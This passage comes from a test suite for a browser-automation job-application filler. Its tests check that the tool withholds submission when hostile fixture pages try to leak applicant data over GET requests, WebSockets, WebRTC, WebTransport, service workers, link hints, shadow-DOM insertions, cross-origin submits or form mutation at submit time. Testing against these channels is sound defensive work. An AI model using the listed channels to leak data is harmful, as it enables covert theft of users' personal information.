  ['/native-custom-required-display-contents', 'display-required-owner'],
  ['/native-custom-required-oversized-owner', 'oversized-required-owner']
]) {
  test('v4 fails closed when required owner evidence is empty or ambiguous for ' + ownerFailure[1], async () => {
    const emailSelector = ownerFailure[0].includes('starred')
      ? '#legend-email'
      : ownerFailure[0].includes('display')
        ? '#display-owner-email'
        : ownerFailure[0].includes('oversized')
          ? '#oversized-owner-email'
        : '#mixed-owner-email';
    const run = await runV4(ownerFailure[0], [
      { type: 'fill', selector: emailSelector, value: 'applicant@example.com', label: 'email' }
    ]);
    assert.equal(run.status, 0, JSON.stringify(run.error));
    assert.deepEqual(run.requests, []);
    assert.equal(run.result.submitOutcome.pressed, false);
    if (ownerFailure[0].includes('oversized')) {
      assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
      assert.equal(run.result.requiredFieldConfirmation, null);
    } else {
      assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
    }
  });
}

test('v4 does not block native required controls barred from constraint validation', async () => {
  const run = await runV4(
    '/native-barred-required-controls',
    [{ type: 'fill', selector: '#barred-email', value: 'applicant@example.com', label: 'email' }]
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com&readonly_value='
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

for (const externalOwnerCase of [
  ['a custom aria-required owner', '/native-external-custom-required-empty', 'external-required-owner', '#external-email'],
  ['an external required marker owner', '/native-external-marker-required-empty', 'department', '#external-email'],
  ['an external aria-owns owner', '/native-external-aria-owns-empty', 'aria-owns-required-owner', '#aria-owns-email']
]) {
  test('v4 catches an empty form-associated backing control under ' + externalOwnerCase[0], async () => {
    const run = await runV4(
      externalOwnerCase[1],
      [{ type: 'fill', selector: externalOwnerCase[3], value: 'applicant@example.com', label: 'email' }]
    );
    assert.equal(run.status, 0, JSON.stringify(run.error));
    assert.deepEqual(run.requests, []);
    assert.equal(run.result.submitOutcome.pressed, false);
    assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
    assert.match(
      run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
      new RegExp(externalOwnerCase[2])
    );
  });
}

test('v4 accepts an external custom required owner only when its native backing entry is populated', async () => {
  const run = await runV4(
    '/native-external-custom-required-answered',
    [{ type: 'fill', selector: '#external-email', value: 'applicant@example.com', label: 'email' }]
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com&department=engineering'
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 accepts an external aria-owns required owner only with a populated bound backing entry', async () => {
  const run = await runV4(
    '/native-external-aria-owns-answered',
    [{ type: 'fill', selector: '#aria-owns-email', value: 'applicant@example.com', label: 'email' }]
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com&department=engineering'
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 required fieldset owner blocks when its native child entry is empty', async () => {
  const run = await runV4(
    '/native-required-fieldset-empty',
    [{ type: 'fill', selector: '#fieldset-email', value: 'applicant@example.com', label: 'email' }]
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.match(
    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
    /required-fieldset/
  );
});

test('v4 required fieldset owner accepts a populated native child without a duplicate blocker', async () => {
  const run = await runV4(
    '/native-required-fieldset-answered',
    [{ type: 'fill', selector: '#fieldset-email', value: 'applicant@example.com', label: 'email' }]
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com&department=engineering'
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 blocks activation-time aria-label drift on an authorized submitter', async () => {
  const run = await runV4(
    '/native-aria-label-drift',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'protected_surface_mutated');
  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 ignores a page-world late submit-label getter and preserves exact uploaded bytes', async () => {
  const run = await runV4('/native-late-file-getter-substitution', [
    { type: 'fill', selector: '#late-email', value: 'applicant@example.com', label: 'email' },
    {
      type: 'upload',
      selector: '#late-resume',
      label: 'resume',
      file: {
        name: 'resume.pdf',
        mimeType: 'application/pdf',
        base64: Buffer.from('resume').toString('base64')
      }
    }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.equal(run.requests.length, 1, JSON.stringify(run.requests, null, 2));
  assertMultipartPost(run.requests[0], '/native-file-integrity-real', [
    multipartTextPart('email', 'applicant@example.com'),
    multipartFilePart('resume'),
    multipartTextPart('getter_state', 'not_called')
  ]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(run.result.finalSubmitChooser.outcome, 'selected');
});

for (const webSocketCase of [
  ['pre-chooser fill', '/native-websocket-pre-chooser'],
  ['final activation', '/native-websocket-activation']
]) {
  test('v4 blocks WebSocket transmission during ' + webSocketCase[0], async () => {
    const run = await runV4(
      webSocketCase[1],
      minimalV4Fills('#native-email', '#native-resume')
    );
    assert.equal(run.status, 0, JSON.stringify(run.error));
    assert.deepEqual(run.websocketConnections, []);
    assert.deepEqual(run.websocketFrames, []);
    assert.deepEqual(run.requests, []);
    assertScriptInterceptedPostTransport(run.result);
  });
}

for (const routeInvisibleCase of [
  {
    name: 'RTCPeerConnection data channel from a caller fill handler',
    fixture: '/native-rtc-pre-chooser',
    expectedState: 'rtc:constructor-blocked'
  },
  {
    name: 'WebTransport datagram from the final activation handler',
    fixture: '/native-webtransport-activation',
    expectedState: 'webtransport:constructor-blocked',
    postSubmitStateObservable: false
  },
  {
    name: 'WebSocketStream from a caller fill handler',
    fixture: '/native-websocketstream-pre-chooser',
    expectedState: 'websocketstream:constructor-blocked'
  },
  {
    name: 'WebSocketStream from the final activation handler',
    fixture: '/native-websocketstream-activation',
    expectedState: 'websocketstream:constructor-blocked',
    postSubmitStateObservable: false
  },
  {
    name: 'service-worker registration from a caller fill handler',
    fixture: '/native-serviceworker-pre-chooser',
    expectedState: 'serviceworker:register-blocked'
  },
  {
    name: 'blocked Worker constructor in an initial popup',
    fixture: '/native-popup-route-invisible',
    expectedState: 'popup-worker:blocked'
  },
  {
    name: 'legacy three-argument document.open popup alias',
    fixture: '/native-document-open-popup',
    expectedState: 'document-open-popup:blocked'
  },
  {
    name: 'WebSocketStream from an inline initial-load script',
    fixture: '/native-initial-script-transport',
    expectedState: 'initial-websocketstream:blocked'
  },
  {
    name: 'dynamic dns-prefetch hint from a caller fill handler',
    fixture: '/native-dns-prefetch-pre-chooser',
    expectedState: 'dns-prefetch:hint-blocked'
  },
  {
    name: 'dynamic preconnect hint from the final activation handler',
    fixture: '/native-preconnect-activation',
    expectedState: 'preconnect:hint-blocked',
    postSubmitStateObservable: false
  },
  {
    name: 'connected link rel setter after a caller fill handler',
    fixture: '/native-connected-rel-pre-chooser',
    expectedState: 'connected-rel-setter:blocked'
  },
  {
    name: 'connected link relList token mutation from the final activation handler',
    fixture: '/native-connected-rel-list-activation',
    expectedState: 'connected-rel-list:blocked',
    postSubmitStateObservable: false
  },
  {
    name: 'connected ShadowRoot innerHTML link insertion from a caller fill handler',
    fixture: '/native-shadow-hint-inner-html',
    expectedState: 'shadow-inner-html:blocked'
  },
  {
    name: 'inert-parser link insertion through a closed ShadowRoot',
    fixture: '/native-closed-shadow-replace-children',
    expectedState: 'closed-shadow-replace-children:blocked'
  },
  {
    name: 'oversized link fragment insertion through a closed ShadowRoot',
    fixture: '/native-closed-shadow-large-fragment',
    expectedState: 'closed-shadow-large-fragment:blocked'
  },
  {
    name: 'entity-encoded link markup through a closed ShadowRoot',
    fixture: '/native-closed-shadow-entity-inner-html',
    expectedState: 'closed-shadow-entity-inner-html:blocked'
  },
  {
    name: 'Attr nodeValue rel mutation inside a closed ShadowRoot',
    fixture: '/native-closed-shadow-attr-node-value',
    expectedState: 'closed-shadow-attr-node-value:blocked'
  },
  {
    name: 'NamedNodeMap rel insertion inside a closed ShadowRoot',
    fixture: '/native-closed-shadow-named-node-map',
    expectedState: 'closed-shadow-named-node-map:blocked'
  },
  {
    name: 'split-token variadic document.write link insertion',
    fixture: '/native-variadic-document-write',
    expectedState: 'variadic-document-write:blocked'
  },
  {
    name: 'nested iframe srcdoc link insertion in a shadow tree',
    fixture: '/native-nested-iframe-srcdoc',
    expectedState: 'nested-iframe-srcdoc:blocked'
  },
  {
    name: 'ParentNode moveBefore with a prebuilt hint',
    fixture: '/native-move-before-hint',
    expectedState: 'move-before:blocked'
  },
  {
    name: 'execCommand insertHTML with a route-invisible hint',
    fixture: '/native-exec-command-hint',
    expectedState: 'exec-command-insert-html:blocked'
  },
  {
    name: 'href attribute retargeting in a shadow tree',
    fixture: '/native-shadow-href-attribute',
    expectedState: 'closed-shadow-href-attribute:blocked'
  },
  {
    name: 'NamedNodeMap href retargeting in a shadow tree',
    fixture: '/native-shadow-href-named-map',
    expectedState: 'closed-shadow-href-named-map:blocked'
  }
]) {
  test('v4 structurally blocks ' + routeInvisibleCase.name + ' and withholds the native POST', async () => {
    const run = await runV4(
      routeInvisibleCase.fixture,
      minimalV4Fills('#native-email', '#native-resume'),
      routeInvisibleCase.postSubmitStateObservable === false
        ? []
        : [{ type: 'extract', selector: '#transport-state' }]
    );
    assert.equal(run.status, 0, JSON.stringify(run.error));
    if (routeInvisibleCase.postSubmitStateObservable === false) {
      // Aborting the held native navigation can replace the document with Chromium's error page.
      // The typed activation result is authoritative after that point, not post-submit page state.
      assert.equal(run.result.submitOutcome.observationDisposition, 'post_submit_observation_failed');
    } else {
      assert.equal(
        valueOf(run.result, '#transport-state'),
        routeInvisibleCase.expectedState,
        'the route-invisible primitive must be denied before it returns a usable transport'
      );
    }
    assert.deepEqual(
      run.requests,
      [],
      'an observed route-invisible attempt must withhold the caller-bound native endpoint write'
    );
    assertScriptInterceptedPostTransport(run.result);
  });
}

test('v4 records a parser-time preconnect attempt in a post-fill data frame', async () => {
  const run = await runV4('/native-data-frame-hint', [
    ...minimalV4Fills('#native-email', '#native-resume'),
    { type: 'waitForSelector', selector: '#data-frame-loaded', timeout: 5000 }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assertScriptInterceptedPostTransport(run.result);
});

test('v4 records a parser-time preconnect attempt in a noopener data popup', async () => {
  const run = await runV4('/native-data-popup-hint', [
    ...minimalV4Fills('#native-email', '#native-resume'),
    { type: 'waitForSelector', selector: '#data-popup-attempted', timeout: 5000 }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assertScriptInterceptedPostTransport(run.result);
});

for (const safeDomCase of [
  ['/native-safe-string-replace-children', 'safe-string-replace-children:allowed'],
  ['/native-safe-class-list-token', 'safe-class-list-token:allowed'],
  ['/native-safe-markup-primitives', 'safe-markup-primitives:allowed'],
  ['/native-stateful-rel-coercion', 'stateful-rel-coercion:normalized'],
  ['/native-shadow-url-component', 'closed-shadow-url-component-expando:allowed']
]) {
  test('v4 route lock preserves safe DOM behavior for ' + safeDomCase[0], async () => {
    const run = await runV4(
      safeDomCase[0],
      minimalV4Fills('#native-email', '#native-resume')
    );
    assert.equal(run.status, 0, JSON.stringify(run.error));
    assert.deepEqual(run.getExfilRequests, []);
    assert.equal(run.requests.length, 1);
    assertMultipartPost(run.requests[0], '/native-real', [
      multipartTextPart('email', 'applicant@example.com'),
      multipartFilePart('resume'),
      multipartTextPart('transport_state', safeDomCase[1])
    ]);
    assert.equal(run.result.submitOutcome.pressed, true);
    assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
  });
}

for (const getExfilCase of [
  ['GET fetch during a caller fill handler', '/native-get-exfil-fetch'],
  ['image URL during a caller fill handler', '/native-get-exfil-image'],
  ['delayed GET fetch from final activation', '/native-get-exfil-activation-delayed']
]) {
  test('v4 blocks caller data exfiltration through ' + getExfilCase[0], async () => {
    const run = await runV4(
      getExfilCase[1],
      minimalV4Fills('#native-email', '#native-resume')
    );
    assert.equal(run.status, 0, JSON.stringify(run.error));
    assert.deepEqual(run.getExfilRequests, [], 'the caller value must never reach the GET endpoint');
    assert.deepEqual(run.requests, [], 'the final native POST must remain withheld');
    assert.equal(run.result.submitOutcome.pressed, false);
    assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
    assert.equal(
      run.result.requiredFieldConfirmation.passes[0].blockerReason,
      'submit_transport_unpinned'
    );
    assert.equal(run.result.finalSubmitChooser.outcome, 'activation_blocked');
  });
}

test('v4 rejects a cross-origin native submit before applicant data can be replayed', async () => {
  const origin = `http://job-boards.greenhouse.io:${server.address().port}`;
  const run = await runV4(
    '/native-cross-site-cookie',
    minimalV4Fills('#native-email', '#native-resume'),
    [],
    origin,
    {
      STRATUS_TEST_SEED_COOKIES_JSON: JSON.stringify([{
        name: 'strict_session',
        value: 'must-not-cross-site',
        domain: '127.0.0.1',
        path: '/',
        sameSite: 'Strict',
        secure: false
      }])
    }
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(
    run.result.requiredFieldConfirmation.passes[0].blockerReason,
    'submit_transport_unsupported'
  );
  assert.equal(run.result.finalSubmitChooser.outcome, 'transport_unsupported');
});

test('v4 rejects a formdata payload swap despite a page-realm SubtleCrypto sign monkeypatch', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-formdata-crypto-monkeypatch',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_payload_changed');
  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 rejects page-state activation forgery after click-time novalidate mutation', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-page-state-forgery',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'protected_surface_mutated');
  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 synthetic SubmitEvent and FormDataEvent witnesses cannot authorize a native write', async () => {
  const { status, result, clicks: recorded, requests } = await runV4(
    '/native-activation-synthetic-witness',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  // Script-constructed events are untrusted, so the isolated activation witness never accepts
  // their FormData payload. This is a typed activation refusal, not evidence that the bound form
  // identity itself changed.
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_formdata_unobserved');
  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
});

test('v4 refuses a canceled trusted submit followed by cached direct form submission', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-activation-submit-cancel-direct-real',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_event_canceled');
  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
});

test('v4 binds the authorized required-state fingerprint across submit-gate installation', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-activation-pre-arm-required',
    minimalV4Fills('#native-email', '#native-resume'),
    [],
    undefined,
    { STRATUS_TEST_PRE_ARM_ARIA_REQUIRED: '1' }
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(
    result.requiredFieldConfirmation.passes[0].blockerReason,
    'submit_activation_binding_changed'
  );
  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 preserves a blocked ancillary attempt across submit-gate installation', async () => {
  const run = await runV4(
    '/native-activation-normal',
    minimalV4Fills('#native-email', '#native-resume'),
    [],
    undefined,
    { STRATUS_TEST_PRE_ARM_FETCH: '1' }
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.getExfilRequests, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(
    run.result.requiredFieldConfirmation.passes[0].blockerReason,
    'submit_transport_unpinned'
  );
  assert.equal(run.result.finalSubmitChooser.outcome, 'activation_blocked');
});

test('v4 rejects a matching-destination native navigation issued by an iframe clone', async () => {
  const { status, result, clicks: recorded, requests } = await runV4('/native-activation-iframe-clone', [
    { type: 'fill', selector: '#native-email', value: 'applicant@example.com', label: 'email' },
    { type: 'fill', selector: '#native-name', value: 'Mehek', label: 'name' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_event_canceled');
});

for (const activationMutation of [
  ['pointerdown', 'pointerdown', 'protected_surface_mutated'],
  ['mousedown', 'mousedown', 'protected_surface_mutated'],
  ['focus', 'focus', 'protected_surface_mutated'],
  ['click', 'click', 'protected_surface_mutated'],
  ['submit-time action', 'submit-action', 'protected_surface_mutated'],
  ['submit-time association', 'submit-association', 'protected_surface_mutated'],
  ['submit-time aria-required', 'submit-aria-required', 'protected_surface_mutated'],
  ['submit-time starred marker', 'submit-star-marker', 'protected_surface_mutated'],
  ['cached native direct submit to the real form', 'cached-direct-real', 'submit_event_unobserved'],
  ['cached native direct submit to the decoy form', 'cached-direct-decoy', 'submit_event_unobserved']
]) {
  test('v4 blocks ' + activationMutation[0] + ' transport mutation at the final activation boundary', async () => {
    const { status, result, error, clicks: recorded, requests } = await runV4(
      '/native-activation-' + activationMutation[1],
      minimalV4Fills('#native-email', '#native-resume')
    );
    assert.equal(status, 0, JSON.stringify(error));
    assert.deepEqual(recorded, []);
    assert.deepEqual(requests, [], 'neither the real nor decoy endpoint may receive a request');
    assert.equal(result.submitOutcome.pressed, false);
    assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
    assert.equal(result.requiredFieldConfirmation.status, 'blocked');
    assert.equal(
      result.requiredFieldConfirmation.passes[0].blockerReason,
      activationMutation[2]
    );
  });
}

test('v4 refuses a role button bare Send even on a successfully populated application form', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-role-send', workableV4Fills());
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.candidateCount, 0);
  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 0);
});

test('v4 preserves explicit application wording but refuses a non-native role button', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-explicit-role', workableV4Fills());
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation, null);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.candidateCount, 0);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 refuses bare Send when the submitter overrides the application form action', async () => {
  const { status, result, clicks: recorded, screenshot } = await runV4(
    '/workable-formaction-override',
    workableV4Fills()
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(screenshot, true);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(result.finalSubmitChooser.candidateCount, 1);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
  assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
});

test('v4 refuses bare Send when the application form targets a new browsing context', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-form-target', workableV4Fills());
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(result.finalSubmitChooser.candidateCount, 1);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
});

test('v4 refuses bare Send when the document base targets a new browsing context', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-base-target', workableV4Fills());
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(result.finalSubmitChooser.candidateCount, 1);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
});

test('v4 scopes native bare Send to its associated form, not its nearest ancestor form', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-association-decoy', workableV4Fills());
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.candidateCount, 0);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 0);
});

test('v4 invalidates text and file proofs that become read-only or disabled before submission', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-control-state-drift', [
    ...workableV4Fills(),
    { type: 'click', selector: '#mutate-control-state' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.ok(result.requiredFieldConfirmation, JSON.stringify(result, null, 2));
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 treats equal bare Send controls as ambiguous and clicks neither', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-ambiguous-send', workableV4Fills());
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation, null);
  assert.equal(result.finalSubmitChooser.outcome, 'ambiguous_submit');
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 2);
  assert.equal(result.finalSubmitChooser.topScore, 0);
  assert.equal(result.finalSubmitChooser.topScoreCount, 2);
});

test('v4 filters non-native explicit wording before evaluating the remaining bare Send', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-explicit-wins', workableV4Fills());
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertUnsupportedNativeSubmitter(result);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
  assert.equal(result.finalSubmitChooser.topScore, 0);
  assert.equal(result.finalSubmitChooser.topScoreCount, 1);
});

test('v4 revalidates successful controls and refuses after the application form is replaced', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-form-drift', [
    ...workableV4Fills(),
    { type: 'click', selector: '#rerender', label: 'refresh_form' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 0);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 proof loss cannot redirect to an explicit submit on another form', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/workable-proof-loss-explicit-decoy',
    [...workableV4Fills(), { type: 'click', selector: '#drop-proofs', label: 'refresh_application' }]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 activation capture blocks pointerdown drift before a direct click transport', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/workable-activation-pointer-drift', workableV4Fills()
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason,
    'protected_surface_mutated');
  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 activation capture blocks click drift before form or direct network handlers transmit', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/workable-activation-click-drift', workableV4Fills()
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason,
    'protected_surface_mutated');
  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 no-click blocks pre-chooser fill change upload and select transports', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-prechooser-auto-submit', [
    ...workableV4Fills(),
    { type: 'select', selector: '#prechooser-select', value: 'Dubai', label: 'location' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation, null);
  assert.equal(result.finalSubmitChooser.outcome, 'ambiguous_submit');
});

test('v4 refuses a two-field job alert form with native bare Send', async () => {
  const { status, result, clicks: recorded } = await runV4('/job-alert-bare-send', [
    { type: 'fill', selector: '#alert-email', value: 'applicant@example.com' },
    { type: 'fill', selector: '#keywords', value: 'engineering' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 refuses a populated talent network even when its resume upload succeeded', async () => {
  const { status, result, clicks: recorded } = await runV4('/talent-pool-bare-send', [
    { type: 'fill', selector: '#talent-name', value: 'Mehek' },
    { type: 'fill', selector: '#talent-email', value: 'applicant@example.com' },
    {
      type: 'upload', selector: '#talent-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 accepts snake_case application and resume identity tokens', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/minimal-file-drift',
    minimalV4Fills('#drift-email', '#drift-resume')
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 invalidates a substituted one-file resume proof', async () => {
  const { status, result, clicks: recorded } = await runV4('/minimal-file-drift', [
    ...minimalV4Fills('#drift-email', '#drift-resume'),
    { type: 'click', selector: '#mutate' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
});

test('v4 invalidates a checked choice whose value and label drift', async () => {
  const { status, result, clicks: recorded } = await runV4('/choice-drift', [
    {
      type: 'upload', selector: '#choice-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    },
    { type: 'fillByLabelText', text: 'Authorized to work?', value: 'Yes' },
    { type: 'click', selector: '#mutate' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
});

test('v4 accepts a verified fillByLabelText choice as one of two proofs', async () => {
  const { status, result, clicks: recorded } = await runV4('/choice-drift', [
    {
      type: 'upload', selector: '#choice-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    },
    { type: 'fillByLabelText', text: 'Authorized to work?', value: 'Yes' }
  ]);
